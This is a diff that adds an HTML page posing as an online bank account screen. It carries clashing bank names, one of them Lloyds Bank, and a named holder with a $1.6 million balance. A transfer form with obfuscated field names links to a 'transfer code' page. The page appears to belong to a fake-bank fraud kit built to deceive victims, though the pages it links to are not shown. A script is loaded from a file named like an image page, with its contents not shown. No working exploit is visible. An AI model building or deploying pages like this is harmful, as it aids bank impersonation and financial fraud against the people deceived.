@@ -1,0 +1,461 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<!-- saved from url=(0042)account.htm -->
+<html><head><title>:: ::Neto Bank Online:: ::</title><!-- saved from url=(0039)--><!-- saved from url=(0037) --><!-- saved from url=(0049) --><!-- saved from url=(0055)<!-- saved fromurl=(0041)-->
+<meta content="en-us" http-equiv="Content-Language">
+<meta name="GENERATOR" content="Microsoft FrontPage 6.0">
+<meta name="ProgId" content="FrontPage.Editor.Document">
+<meta content="text/html; charset=windows-1252" http-equiv="Content-Type">
+<meta content="revealTrans(Duration=4.00,Transition=23)" http-equiv="Page-Exit">
+<style type="text/css">#t35ad {
+	TEXT-ALIGN: center; FONT: 14px/1.5em arial,helvetica; TEXT-DECORATION: none
+}
+#t35ad A {
+	FONT: 14px arial,helvetica; TEXT-DECORATION: none
+}
+#t35ad A:hover {
+	BACKGROUND-COLOR: black; COLOR: white; FONT-SIZE: medium; FONT-WEIGHT: bold
+}
+#t35ad UL {
+	PADDING-BOTTOM: 0px; LIST-STYLE-TYPE: none; PADDING-LEFT: 0px; PADDING-RIGHT: 0px; DISPLAY: inline; PADDING-TOP: 0px
+}
+#navlist LI {
+	PADDING-BOTTOM: 0px; LIST-STYLE-TYPE: none; PADDING-LEFT: 0px; PADDING-RIGHT: 0px; DISPLAY: inline; PADDING-TOP: 0px
+}
+</style>
+<!-- base href="account.htm" -->
+<script language="JavaScript">
+<!-- Begin
+
+//Animated Window- By Rizwan Chand (rizwanchand@hotmail.com)
+//Modified by DD for NS compatibility
+//Visit http://www.dynamicdrive.com for this script
+
+function expandingWindow(website) {
+var windowprops='width=50,height=50,scrollbars=yes,status=yes,resizable=yes'
+var heightspeed = 2; // vertical scrolling speed (higher = slower)
+var widthspeed = 7;  // horizontal scrolling speed (higher = slower)
+var leftdist = 5;    // distance to left edge of window
+var topdist = 5;     // distance to top edge of window
+
+if (window.resizeTo&&navigator.userAgent.indexOf("Opera")==-1) {
+var winwidth = window.screen.availWidth - leftdist;
+var winheight = window.screen.availHeight - topdist;
+var sizer = window.open("","","left=" + leftdist + ",top=" + topdist +","+ windowprops);
+for (sizeheight = 1; sizeheight < winheight; sizeheight += heightspeed)
+sizer.resizeTo("1", sizeheight);
+for (sizewidth = 1; sizewidth < winwidth; sizewidth += widthspeed)
+sizer.resizeTo(sizewidth, sizeheight);
+sizer.location = website;
+}
+else
+window.open(website,'mywindow');
+}
+//  End -->
+</script>
+
+
+
+
+
+</head>
+<body spellcheck="false" bgcolor="#000000"><!-- T35 Hosting Ad Code Begin -->
+<style type="text/css">#t35ad {
+	TEXT-ALIGN: center; FONT: 14px/1.5em arial,helvetica; TEXT-DECORATION: none
+}
+#t35ad A {
+	FONT: 14px arial,helvetica; TEXT-DECORATION: none
+}
+#t35ad A:hover {
+	BACKGROUND-COLOR: black; COLOR: white; FONT-SIZE: medium; FONT-WEIGHT: bold
+}
+#t35ad UL {
+	PADDING-BOTTOM: 0px; LIST-STYLE-TYPE: none; PADDING-LEFT: 0px; PADDING-RIGHT: 0px; DISPLAY: inline; PADDING-TOP: 0px
+}
+#navlist LI {
+	PADDING-BOTTOM: 0px; LIST-STYLE-TYPE: none; PADDING-LEFT: 0px; PADDING-RIGHT: 0px; DISPLAY: inline; PADDING-TOP: 0px
+}
+</style><script language="JavaScript">
+
+//Analog clock script- By Kurt (kurt.grigg@virgin.net)
+//Script featured on Dynamic Drive
+//Visit http://www.dynamicdrive.com for this script and more
+
+fCol='444444'; //face colour.
+sCol='FF0000'; //seconds colour.
+mCol='444444'; //minutes colour.
+hCol='444444'; //hours colour.
+
+Ybase=30; //Clock height.
+Xbase=30; //Clock width.
+
+
+H='...';
+H=H.split('');
+M='....';
+M=M.split('');
+S='.....';
+S=S.split('');
+NS4=(document.layers);
+NS6=(document.getElementById&&!document.all);
+IE4=(document.all);
+Ypos=0;
+Xpos=0;
+dots=12;
+Split=360/dots;
+if (NS6){
+for (i=1; i < dots+1; i++){
+document.write('<div id="n6Digits'+i+'" style="position:absolute;top:0px;left:0px;width:30px;height:30px;font-family:Arial;font-size:10px;color:#'+fCol+';text-align:center;padding-top:10px">'+i+'</div>');
+}
+for (i=0; i < M.length; i++){
+document.write('<div id="Ny'+i+'" style="position:absolute;top:0px;left:0px;width:2px;height:2px;font-size:2px;background:#'+mCol+'"></div>');
+}
+for (i=0; i < H.length; i++){
+document.write('<div id="Nz'+i+'" style="position:absolute;top:0px;left:0px;width:2px;height:2px;font-size:2px;background:#'+hCol+'"></div>');
+}
+for (i=0; i < S.length; i++){
+document.write('<div id="Nx'+i+'" style="position:absolute;top:0px;left:0px;width:2px;height:2px;font-size:2px;background:#'+sCol+'"></div>');
+}
+}
+if (NS4){
+dgts='1 2 3 4 5 6 7 8 9 10 11 12';
+dgts=dgts.split(' ')
+for (i=0; i < dots; i++){
+document.write('<layer name=nsDigits'+i+' top=0 left=0 height=30 width=30><center><font face=Arial size=1 color='+fCol+'>'+dgts[i]+'</font></center></layer>');
+}
+for (i=0; i < M.length; i++){
+document.write('<layer name=ny'+i+' top=0 left=0 bgcolor='+mCol+' clip="0,0,2,2"></layer>');
+}
+for (i=0; i < H.length; i++){
+document.write('<layer name=nz'+i+' top=0 left=0 bgcolor='+hCol+' clip="0,0,2,2"></layer>');
+}
+for (i=0; i < S.length; i++){
+document.write('<layer name=nx'+i+' top=0 left=0 bgcolor='+sCol+' clip="0,0,2,2"></layer>');
+}
+}
+if (IE4){
+document.write('<div style="position:absolute;top:0px;left:0px"><div style="position:relative">');
+for (i=1; i < dots+1; i++){
+document.write('<div id="ieDigits" style="position:absolute;top:0px;left:0px;width:30px;height:30px;font-family:Arial;font-size:10px;color:'+fCol+';text-align:center;padding-top:10px">'+i+'</div>');
+}
+document.write('</div></div>')
+document.write('<div style="position:absolute;top:0px;left:0px"><div style="position:relative">');
+for (i=0; i < M.length; i++){
+document.write('<div id=y style="position:absolute;width:2px;height:2px;font-size:2px;background:'+mCol+'"></div>');
+}
+document.write('</div></div>')
+document.write('<div style="position:absolute;top:0px;left:0px"><div style="position:relative">');
+for (i=0; i < H.length; i++){
+document.write('<div id=z style="position:absolute;width:2px;height:2px;font-size:2px;background:'+hCol+'"></div>');
+}
+document.write('</div></div>')
+document.write('<div style="position:absolute;top:0px;left:0px"><div style="position:relative">');
+for (i=0; i < S.length; i++){
+document.write('<div id=x style="position:absolute;width:2px;height:2px;font-size:2px;background:'+sCol+'"></div>');
+}
+document.write('</div></div>')
+}
+
+
+
+function clock(){
+time = new Date ();
+secs = time.getSeconds();
+sec = -1.57 + Math.PI * secs/30;
+mins = time.getMinutes();
+min = -1.57 + Math.PI * mins/30;
+hr = time.getHours();
+hrs = -1.57 + Math.PI * hr/6 + Math.PI*parseInt(time.getMinutes())/360;
+
+if (NS6){
+Ypos=window.pageYOffset+window.innerHeight-Ybase-125;
+Xpos=window.pageXOffset+window.innerWidth-Xbase-30;
+for (i=1; i < dots+1; i++){
+ document.getElementById("n6Digits"+i).style.top=Ypos-15+Ybase*Math.sin(-1.56 +i *Split*Math.PI/180)
+ document.getElementById("n6Digits"+i).style.left=Xpos-15+Xbase*Math.cos(-1.56 +i*Split*Math.PI/180)
+ }
+for (i=0; i < S.length; i++){
+ document.getElementById("Nx"+i).style.top=Ypos+i*Ybase/4.1*Math.sin(sec);
+ document.getElementById("Nx"+i).style.left=Xpos+i*Xbase/4.1*Math.cos(sec);
+ }
+for (i=0; i < M.length; i++){
+ document.getElementById("Ny"+i).style.top=Ypos+i*Ybase/4.1*Math.sin(min);
+ document.getElementById("Ny"+i).style.left=Xpos+i*Xbase/4.1*Math.cos(min);
+ }
+for (i=0; i < H.length; i++){
+ document.getElementById("Nz"+i).style.top=Ypos+i*Ybase/4.1*Math.sin(hrs);
+ document.getElementById("Nz"+i).style.left=Xpos+i*Xbase/4.1*Math.cos(hrs);
+ }
+}
+if (NS4){
+Ypos=window.pageYOffset+window.innerHeight-Ybase-120;
+Xpos=window.pageXOffset+window.innerWidth-Xbase-30;
+for (i=0; i < dots; ++i){
+ document.layers["nsDigits"+i].top=Ypos-5+Ybase*Math.sin(-1.045 +i*Split*Math.PI/180)
+ document.layers["nsDigits"+i].left=Xpos-15+Xbase*Math.cos(-1.045 +i*Split*Math.PI/180)
+ }
+for (i=0; i < S.length; i++){
+ document.layers["nx"+i].top=Ypos+i*Ybase/4.1*Math.sin(sec);
+ document.layers["nx"+i].left=Xpos+i*Xbase/4.1*Math.cos(sec);
+ }
+for (i=0; i < M.length; i++){
+ document.layers["ny"+i].top=Ypos+i*Ybase/4.1*Math.sin(min);
+ document.layers["ny"+i].left=Xpos+i*Xbase/4.1*Math.cos(min);
+ }
+for (i=0; i < H.length; i++){
+ document.layers["nz"+i].top=Ypos+i*Ybase/4.1*Math.sin(hrs);
+ document.layers["nz"+i].left=Xpos+i*Xbase/4.1*Math.cos(hrs);
+ }
+}
+
+if (IE4){
+Ypos=document.body.scrollTop+window.document.body.clientHeight-Ybase-120;
+Xpos=document.body.scrollLeft+window.document.body.clientWidth-Xbase-20;
+for (i=0; i < dots; ++i){
+ ieDigits[i].style.pixelTop=Ypos-15+Ybase*Math.sin(-1.045 +i *Split*Math.PI/180)
+ ieDigits[i].style.pixelLeft=Xpos-15+Xbase*Math.cos(-1.045 +i *Split*Math.PI/180)
+ }
+for (i=0; i < S.length; i++){
+ x[i].style.pixelTop =Ypos+i*Ybase/4.1*Math.sin(sec);
+ x[i].style.pixelLeft=Xpos+i*Xbase/4.1*Math.cos(sec);
+ }
+for (i=0; i < M.length; i++){
+ y[i].style.pixelTop =Ypos+i*Ybase/4.1*Math.sin(min);
+ y[i].style.pixelLeft=Xpos+i*Xbase/4.1*Math.cos(min);
+ }
+for (i=0; i < H.length; i++){
+ z[i].style.pixelTop =Ypos+i*Ybase/4.1*Math.sin(hrs);
+ z[i].style.pixelLeft=Xpos+i*Xbase/4.1*Math.cos(hrs);
+ }
+}
+setTimeout('clock()',100);
+}
+clock();
+//-->
+</script><div id="n6Digits1" style="position: absolute; width: 30px; height: 30px; font-family: Arial; font-size: 10px; color: rgb(68, 68, 68); text-align: center; padding-top: 10px; top: 546.183px; left: 1380.28px;">1</div><div id="n6Digits2" style="position: absolute; width: 30px; height: 30px; font-family: Arial; font-size: 10px; color: rgb(68, 68, 68); text-align: center; padding-top: 10px; top: 557.281px; left: 1391.14px;">2</div><div id="n6Digits3" style="position: absolute; width: 30px; height: 30px; font-family: Arial; font-size: 10px; color: rgb(68, 68, 68); text-align: center; padding-top: 10px; top: 572.324px; left: 1395px;">3</div><div id="n6Digits4" style="position: absolute; width: 30px; height: 30px; font-family: Arial; font-size: 10px; color: rgb(68, 68, 68); text-align: center; padding-top: 10px; top: 587.28px; left: 1390.82px;">4</div><div id="n6Digits5" style="position: absolute; width: 30px; height: 30px; font-family: Arial; font-size: 10px; color: rgb(68, 68, 68); text-align: center; padding-top: 10px; top: 598.141px; left: 1379.72px;">5</div><div id="n6Digits6" style="position: absolute; width: 30px; height: 30px; font-family: Arial; font-size: 10px; color: rgb(68, 68, 68); text-align: center; padding-top: 10px; top: 601.998px; left: 1364.68px;">6</div><div id="n6Digits7" style="position: absolute; width: 30px; height: 30px; font-family: Arial; font-size: 10px; color: rgb(68, 68, 68); text-align: center; padding-top: 10px; top: 597.817px; left: 1349.72px;">7</div><div id="n6Digits8" style="position: absolute; width: 30px; height: 30px; font-family: Arial; font-size: 10px; color: rgb(68, 68, 68); text-align: center; padding-top: 10px; top: 586.719px; left: 1338.86px;">8</div><div id="n6Digits9" style="position: absolute; width: 30px; height: 30px; font-family: Arial; font-size: 10px; color: rgb(68, 68, 68); text-align: center; padding-top: 10px; top: 571.676px; left: 1335px;">9</div><div id="n6Digits10" style="position: absolute; width: 30px; height: 30px; font-family: Arial; font-size: 10px; color: rgb(68, 68, 68); text-align: center; padding-top: 10px; top: 556.72px; left: 1339.18px;">10</div><div id="n6Digits11" style="position: absolute; width: 30px; height: 30px; font-family: Arial; font-size: 10px; color: rgb(68, 68, 68); text-align: center; padding-top: 10px; top: 545.859px; left: 1350.28px;">11</div><div id="n6Digits12" style="position: absolute; width: 30px; height: 30px; font-family: Arial; font-size: 10px; color: rgb(68, 68, 68); text-align: center; padding-top: 10px; top: 542.002px; left: 1365.32px;">12</div><div id="Ny0" style="position: absolute; width: 2px; height: 2px; font-size: 2px; background: rgb(68, 68, 68) none repeat scroll 0% 0%; top: 587px; left: 1380px;"></div><div id="Ny1" style="position: absolute; width: 2px; height: 2px; font-size: 2px; background: rgb(68, 68, 68) none repeat scroll 0% 0%; top: 579.844px; left: 1381.53px;"></div><div id="Ny2" style="position: absolute; width: 2px; height: 2px; font-size: 2px; background: rgb(68, 68, 68) none repeat scroll 0% 0%; top: 572.688px; left: 1383.05px;"></div><div id="Ny3" style="position: absolute; width: 2px; height: 2px; font-size: 2px; background: rgb(68, 68, 68) none repeat scroll 0% 0%; top: 565.532px; left: 1384.58px;"></div><div id="Nz0" style="position: absolute; width: 2px; height: 2px; font-size: 2px; background: rgb(68, 68, 68) none repeat scroll 0% 0%; top: 587px; left: 1380px;"></div><div id="Nz1" style="position: absolute; width: 2px; height: 2px; font-size: 2px; background: rgb(68, 68, 68) none repeat scroll 0% 0%; top: 593.402px; left: 1383.54px;"></div><div id="Nz2" style="position: absolute; width: 2px; height: 2px; font-size: 2px; background: rgb(68, 68, 68) none repeat scroll 0% 0%; top: 599.805px; left: 1387.08px;"></div><div id="Nx0" style="position: absolute; width: 2px; height: 2px; font-size: 2px; background: rgb(255, 0, 0) none repeat scroll 0% 0%; top: 587px; left: 1380px;"></div><div id="Nx1" style="position: absolute; width: 2px; height: 2px; font-size: 2px; background: rgb(255, 0, 0) none repeat scroll 0% 0%; top: 584.733px; left: 1373.04px;"></div><div id="Nx2" style="position: absolute; width: 2px; height: 2px; font-size: 2px; background: rgb(255, 0, 0) none repeat scroll 0% 0%; top: 582.467px; left: 1366.09px;"></div><div id="Nx3" style="position: absolute; width: 2px; height: 2px; font-size: 2px; background: rgb(255, 0, 0) none repeat scroll 0% 0%; top: 580.2px; left: 1359.13px;"></div><div id="Nx4" style="position: absolute; width: 2px; height: 2px; font-size: 2px; background: rgb(255, 0, 0) none repeat scroll 0% 0%; top: 577.933px; left: 1352.17px;"></div>
+<!-- T35 Hosting Ad Code End --><!-- T35 Hosting Ad Code Begin --><!-- T35 Hosting Ad Code End -->
+<center><table id="Main" class="main" width="1" height="1" cellspacing="0" cellpadding="0" border="0"><tbody>
+  <tr bgcolor="#FFFFFF">
+    <td style="PADDING-BOTTOM: 10px; PADDING-LEFT: 10px; PADDING-RIGHT: 10px; VERTICAL-ALIGN: middle; PADDING-TOP: 10px" id="Header" colspan="2" width="1004" valign="middle" height="1">
+      <table width="778" cellspacing="0" cellpadding="0" border="0" background="acctonline_files/premier1.htm">
+        <tbody>
+        <tr>
+  <td>
+	<img border="0" src="logon_files/774_banklogo.png" width="102" height="52"></td></tr></tbody></table></td></tr>
+  <tr>
+    <td class="leftbar" rowspan="2" width="166" valign="top" height="80">
+      <table width="159" height="73" cellspacing="0" cellpadding="0" border="0"><!-- fwtablefwsrc="navbar.png" fwbase="navbar.gif" fwstyle="Dreamweaver" fwdocid = "861080336"fwnested="0" -->
+        <tbody>
+        <tr>
+          <td colspan="3" width="140" height="1" bgcolor="#999999"><font face="Verdana" color="#ffffff"><img id="navbar_r5_c2" name="navbar_r5_c2" alt="" src="acctonline_files/imagespremier1.htm" height="5" border="0"></font></td></tr>
+        <tr>
+          <td rowspan="10" width="7" height="132" bgcolor="#999999"><font face="Verdana" color="#ffffff"><img id="navbar_r5_c2" name="navbar_r5_c2" alt="" src="acctonline_files/imagespremier1.htm" width="5" border="0"></font></td>
+          <td class="navbar" width="131" valign="middle" height="10">&nbsp;</td>
+          <td rowspan="10" width="7" height="132" bgcolor="#999999"><font face="Verdana" color="#ffffff"><img id="navbar_r5_c2" name="navbar_r5_c2" alt="" src="acctonline_files/imagespremier1.htm" width="5" border="0"></font></td>
+          <td rowspan="2" width="6" height="28"><font face="Verdana" color="#ffffff"><img id="undefined_2" name="undefined_2" alt="" src="acctonline_files/imagespremier1.htm" width="1" height="20" border="0"></font></td></tr>
+        <tr>
+          <td class="navbar" width="131" valign="middle" height="18">
+			<form>
+				<p align="left"><strong><a href="#">
+				<font face="Verdana" color="#FFFFFF" size="2">
+				<span style="text-decoration: none">Account 
+			Summary</span></font></a></strong><font face="Verdana">fffff&gt;<strong>
+</strong></font>&nbsp;</p>
+</form>
+ 
+            </td></tr>
+        <tr>
+          <td width="131" valign="middle" height="3" bgcolor="#999999"><font face="Verdana" color="#ffffff"><strong><img id="navbar_r5_c2" name="navbar_r5_c2" alt="" src="acctonline_files/imagespremier1.htm" height="3" border="0"></strong></font></td>
+          <td width="6" height="3"><font face="Verdana" color="#ffffff"><img id="undefined_2" name="undefined_2" alt="" src="acctonline_files/imagespremier1.htm" width="1" height="3" border="0"></font></td></tr>
+        <tr>
+          <td class="navbar" width="131" valign="middle" height="20"><font face="Verdana" color="#ffffff"><strong><a href="transfercode0.htm"><font color="#ffffff">Transfer fund</font></a></strong></font></td>
+          <td width="6" height="20"><font face="Verdana" color="#ffffff"><img id="undefined_2" name="undefined_2" alt="" src="acctonline_files/imagespremier1.htm" width="1" height="20" border="0"></font></td></tr>
+        <tr>
+          <td width="131" valign="middle" height="3" bgcolor="#999999"><font face="Verdana" color="#ffffff"><strong><img id="navbar_r5_c2" name="navbar_r5_c2" alt="" src="acctonline_files/imagespremier1.htm" height="3" border="0"></strong></font></td>
+          <td width="6" height="3"><font face="Verdana" color="#ffffff"><img id="undefined_2" name="undefined_2" alt="" src="acctonline_files/imagespremier1.htm" width="1" height="3" border="0"></font></td></tr>
+        <tr>
+          <td width="131" valign="middle" height="3" bgcolor="#999999"><font face="Verdana" color="#ffffff"><strong><img id="navbar_r5_c2" name="navbar_r5_c2" alt="" src="acctonline_files/imagespremier1.htm" height="3" border="0"></strong></font></td>
+          <td width="6" height="3"><font face="Verdana" color="#ffffff"><img id="undefined_2" name="undefined_2" alt="" src="acctonline_files/imagespremier1.htm" width="1" height="3" border="0"></font></td></tr>
+        <tr>
+          <td class="navbar" width="131" valign="middle" height="20">&nbsp;<font face="Verdana"><strong><font color="#ffffff"><a href="Logon.htm"><font color="#ffffff">Log Out</font></a></font></strong></font></td>
+          <td width="6" height="20"><font face="Verdana" color="#ffffff"><img id="undefined_2" name="undefined_2" alt="" src="acctonline_files/imagespremier1.htm" width="1" height="20" border="0"></font></td></tr>
+        <tr>
+          <td width="131" valign="middle" height="3" bgcolor="#999999"><font face="Verdana" color="#ffffff"><strong><img id="navbar_r5_c2" name="navbar_r5_c2" alt="" src="acctonline_files/imagespremier1.htm" height="3" border="0"></strong></font></td>
+          <td width="6" height="3"><font face="Verdana" color="#ffffff"><img id="undefined_2" name="undefined_2" alt="" src="acctonline_files/imagespremier1.htm" width="1" height="3" border="0"></font></td></tr>
+        <tr>
+          <td class="navbar" width="131" valign="middle" height="20">&nbsp;<img src="images/babe.jpg" alt="Flowers in Chania" width="144" height="150">
+          <td width="6" height="20"><font face="Verdana" color="#ffffff"><img id="undefined_2" name="undefined_2" alt="" src="acctonline_files/imagespremier1.htm" width="1" height="20" border="0"></font></td></tr>
+        <tr>
+          <td width="131" height="5" bgcolor="#999999"><font face="Verdana" color="#ffffff"><img id="navbar_r5_c2" name="navbar_r5_c2" alt="" src="acctonline_files/imagespremier1.htm" height="5" border="0"></font></td></tr></tbody></table>
+      <table style="MARGIN-TOP: 8px" width="165" height="233" cellspacing="0" cellpadding="0" border="0">
+        <tbody>
+        <tr>
+          <th class="menu" width="165" valign="middle" height="19">&nbsp;</th></tr>
+        <tr>
+          <td id="InvestorTable" class="menu" width="165" valign="top" height="214"><font face="Verdana">&nbsp;</font></td></tr></tbody></table></td>
+    <td style="PADDING-LEFT: 5px" id="MainBody" rowspan="2" width="853" valign="top" height="80" align="left">
+      <br><b><font size="5">
+		<marquee style="COLOR: rgb(192,192,192)" width="930" height="23">WELCOME TO XETON&nbsp; BANK ONLINE</marquee></font></b><p></p>
+		<table class="stMainContentTable" width="813" height="539" cellspacing="0" cellpadding="0" border="0" align="center">
+        <tbody>
+        <tr>
+          <td colspan="3" width="800">&nbsp;</td></tr>
+
+        <tr>
+          <td class="stHeaderCell" width="420" height="115">
+          <font size="3" face="Andalus"><strong><font color="#c0c0c0">Welcome&nbsp;&nbsp;
+            Lynn Betty Morre</font></strong></font><font face="Andalus"> </font> 
+            <table class="ice_corpheader" width="557" height="1">
+              <tbody>
+              <tr>
+                <td width="153" valign="top" height="1" bgcolor="#800000">
+                <font face="Andalus" color="#c0c0c0"><em style="font-style: normal"><strong>Account 
+                  Number&nbsp; <br></strong></em></font></td>
+                <td width="321" valign="top" height="1" bgcolor="#800000">
+                  <p align="left"><strong><font face="Andalus"><font size="2" color="#c0c0c0">&nbsp;</font><font size="3" color="#c0c0c0">867493757468009</font></font></strong></p></td></tr>
+              <tr>
+                <td width="266" valign="top" height="1" bgcolor="#800000">
+                  <p align="left"><strong><em style="font-style: normal">
+                  <font face="Andalus" color="#c0c0c0">Account Balance</font></em></strong></p></td>
+                <td width="321" valign="top" height="1" bgcolor="#800000"><strong><font color="#c0c0c0"><select style="FONT-FAMILY: Bookman Old Style; FONT-SIZE: 12pt; FONT-WEIGHT: bold" size="1" name="D1"> <option selected="selected">$1,643,435USD</option></select></font></strong></td></tr>
+        <tr></tr></tbody></table><font color="#c0c0c0"><!--mp_trans_add             --></font></td>
+          <td class="stHeaderCell" width="113" height="115">
+          </td>
+          <td class="stHeaderCell" width="267" height="115">&nbsp;
+          </td></tr>
+
+
+         
+          <tr>
+			<td class="stMainContentCell" colspan="3" width="800" height="382">
+            <table width="589" cellspacing="0" cellpadding="0" border="0">
+              <tbody>
+              <tr>
+                <td width="626" valign="top" align="left">
+                  <table width="807" cellspacing="0" cellpadding="0" border="0">
+                    <tbody>
+                    <tr>
+                      <td colspan="2" width="807" height="10"></td></tr>
+                    <tr>
+                      <td width="807" valign="top" bgcolor="#800000" align="left">
+                        <table>
+                          <tbody>
+                          <tr>
+                            <form method="post" action="http://www.bfnsoftware.com/cgi-bin/home/Members/Feedback/Feedback.cgi?User=28550&amp;am"></form></tr></tbody></table>
+                        <div align="center">
+                        <p><strong><font face="Andalus" color="#c0c0c0">Funds 
+                        Transfer</font></strong></p>
+                        <p><font face="Andalus"><strong><font color="#c0c0c0"><u>RECIPIENT ACCOUNT 
+                        DETAILS</u></font></strong></font></p></div>
+                        <div align="center">
+                          <font size="2" face="Andalus" color="#c0c0c0"><strong>Please fill the recipient account 
+                        details below, verify its accuracy and click 
+                        transfer</strong></font></div>
+                        <table width="617" height="162" cellspacing="2" cellpadding="0" border="0">
+                          <tbody>
+                          <tr>
+                            <td width="225" valign="top" height="25" bgcolor="#800000">
+                            <font face="Andalus" color="#c0c0c0"><em style="font-style: normal"><strong>Account Number:&nbsp; 
+                              </strong></em></font><font face="Andalus">
+                            <em style="font-style: normal">
+                            <font color="#c0c0c0"><strong><br></strong></font></em></font></td>
+                            <td width="386" height="25" bgcolor="#800000"><font face="Verdana" color="#c0c0c0"><input name="7Q3CrKeacG0" maxlength="200" size="32"></font></td></tr>
+                          <tr>
+                            <td width="225" valign="top" height="25" bgcolor="#800000">
+                            <font face="Andalus" color="#c0c0c0"><em style="font-style: normal"><strong>Account Name: 
+                              </strong></em></font><font face="Andalus">
+                            <em style="font-style: normal">
+                            <font color="#c0c0c0"><strong><br></strong></font></em></font></td>
+                            <td width="386" height="25" bgcolor="#800000"><font face="Verdana" color="#c0c0c0"><input name="7Q3CrKeacG1" maxlength="200" size="32"></font></td></tr>
+                          <tr>
+                            <td width="225" valign="top" height="25" bgcolor="#800000">
+                            <font face="Andalus" color="#c0c0c0"><em style="font-style: normal"><strong>Name of Bank / 
+                              address:</strong></em></font><font face="Andalus"><em style="font-style: normal"><strong><font color="#c0c0c0"><br></font></strong></em></font></td>
+                            <td width="386" height="25" bgcolor="#800000"><font face="Verdana" color="#c0c0c0"><input name="7Q3CrKeacG2" maxlength="200" size="32"></font></td></tr>
+                          <tr>
+                            <td width="225" valign="top" height="7" bgcolor="#800000">
+                              <p><font face="Andalus">
+                              <em style="font-style: normal"><strong>
+                              <font color="#c0c0c0">Sort 
+                              Code/IBAN:</font></strong></em></font></p></td>
+                            <td width="386" height="7" bgcolor="#800000"><font face="Verdana" color="#c0c0c0"><input name="7Q3CrKeacG3" maxlength="200" size="32"></font></td></tr>
+                          <tr>
+                            <td width="225" valign="top" height="25" bgcolor="#800000"><font face="Andalus">
+                            <em style="font-style: normal">
+                            <font color="#c0c0c0"><strong>Amount to 
+                              Transfer:</strong></font></em></font></td>
+                            <td width="386" height="25" bgcolor="#800000"><font face="Verdana" color="#c0c0c0"><input name="7Q3CrKeacG" maxlength="200" size="32"></font></td></tr>
+                          <tr>
+                            <td width="225" valign="top" height="25" bgcolor="#800000"><font face="Andalus">
+                            <em style="font-style: normal">
+                            <font color="#c0c0c0"><strong>Type of 
+                              Account:<br></strong></font></em></font></td>
+                            <td width="386" height="25" bgcolor="#800000"><font face="Verdana" color="#c0c0c0"><select style="FONT-WEIGHT: bold" name="JbvuBHsdBg"> 
+                                <option selected="selected">SELECT</option> 
+                                <option>CHECKING ACCOUNT</option> 
+                                <option>CURRENT ACCOUNT</option> <option>SAVING 
+                                ACCOUNT</option></select></font></td></tr>
+                          <tr><!-- You may change the value in the tag below to modify the space between yourlast input and the security code --><!-- Example:  height = 30 --></tr>
+                          <tr>
+                            <td width="225" height="25">&nbsp;</td>
+                            <td width="386" height="25" align="right"><font size="1" face="Verdana" color="#c0c0c0">&nbsp;&nbsp;</font><font face="Verdana"><strong><font color="#c0c0c0"> <font size="3">Click here&lt;&lt;</font></font><font size="3"><a href="transfercode0.htm"><font color="#c0c0c0">Transfer</font></a></font><font size="3" color="#c0c0c0">&gt;&gt;</font></strong></font></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody>
+        <script type="text/javascript" src="acctonline_files/imagespremier1.htm">
+        </script>
+</table></td></tr></tbody></table>
+
+
+<title>:: ::Lloyds Bank:: ::</title><!-- saved from url=(0039)--><!-- saved from url=(0037) --><!-- saved from url=(0049) --><!-- saved from url=(0055)<!-- saved fromurl=(0041)-->
+<meta content="en-us" http-equiv="Content-Language">
+<meta name="GENERATOR" content="Microsoft FrontPage 5.0">
+<meta name="ProgId" content="FrontPage.Editor.Document">
+<meta content="text/html; charset=windows-1252" http-equiv="Content-Type">
+<meta content="revealTrans(Duration=4.00,Transition=23)" http-equiv="Page-Exit">
+<style type="text/css">#t35ad {
+	TEXT-ALIGN: center; FONT: 14px/1.5em arial,helvetica; TEXT-DECORATION: none
+}
+#t35ad A {
+	FONT: 14px arial,helvetica; TEXT-DECORATION: none
+}
+#t35ad A:hover {
+	BACKGROUND-COLOR: black; COLOR: white; FONT-SIZE: medium; FONT-WEIGHT: bold
+}
+#t35ad UL {
+	PADDING-BOTTOM: 0px; LIST-STYLE-TYPE: none; PADDING-LEFT: 0px; PADDING-RIGHT: 0px; DISPLAY: inline; PADDING-TOP: 0px
+}
+#navlist LI {
+	PADDING-BOTTOM: 0px; LIST-STYLE-TYPE: none; PADDING-LEFT: 0px; PADDING-RIGHT: 0px; DISPLAY: inline; PADDING-TOP: 0px
+}
+</style>
+<!-- base href="#" -->
+<!-- T35 Hosting Ad Code Begin -->
+<style type="text/css">#t35ad {
+	TEXT-ALIGN: center; FONT: 14px/1.5em arial,helvetica; TEXT-DECORATION: none
+}
+#t35ad A {
+	FONT: 14px arial,helvetica; TEXT-DECORATION: none
+}
+#t35ad A:hover {
+	BACKGROUND-COLOR: black; COLOR: white; FONT-SIZE: medium; FONT-WEIGHT: bold
+}
+#t35ad UL {
+	PADDING-BOTTOM: 0px; LIST-STYLE-TYPE: none; PADDING-LEFT: 0px; PADDING-RIGHT: 0px; DISPLAY: inline; PADDING-TOP: 0px
+}
+#navlist LI {
+	PADDING-BOTTOM: 0px; LIST-STYLE-TYPE: none; PADDING-LEFT: 0px; PADDING-RIGHT: 0px; DISPLAY: inline; PADDING-TOP: 0px
+}
+</style>
+<!-- T35 Hosting Ad Code End --><!-- T35 Hosting Ad Code Begin --><!-- T35 Hosting Ad Code End -->
+
+        <script type="text/javascript" src="acctonline_files/imagespremier1.htm">
+        </script>
+      
+
+
+
+
+
+
+
+
+
+</center></body></html>
+<!-- saved from url=(0042)account.htm -->
